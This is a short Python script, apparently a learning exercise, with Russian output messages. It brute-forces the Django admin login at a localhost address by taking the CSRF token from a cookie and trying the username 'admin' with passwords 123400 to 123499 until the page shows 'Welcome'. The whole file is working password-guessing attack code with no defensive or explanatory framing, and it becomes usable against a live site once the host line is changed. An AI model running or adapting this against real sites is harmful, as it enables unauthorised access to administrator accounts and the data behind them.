import requests

host = 'http://localhost:8000'


def hack_the_site():
    data = requests.get(
        f'{host}/admin/?next=/admin/'
    )
    csrf_token = data.headers.get('Set-Cookie').split(';')[0].split('=')[1]
    print(f"Получили token: {csrf_token}")
    for value in range(123400, 123500):
        password = str(value)
        result = requests.post(
            f'{host}/admin/login/?next=/admin/',
            data={
                'csrfmiddlewaretoken': csrf_token,
                'username': 'admin',
                'password': password
            },
            headers={
                'X-CSRFToken': csrf_token,
                'Cookie': f'csrftoken={csrf_token}'
            }
        )
        if 'Welcome' in result.text:
            print(f'Пароль "{password}".........................OK')
            return password
        else:
            print(f'Пароль "{password}"........................NOT')
    return None


if __name__ == '__main__':
    success_password = hack_the_site()
    if success_password:
        print("Пароль подобран: ", success_password)
    else:
        print("Не удалось подобрать пароль")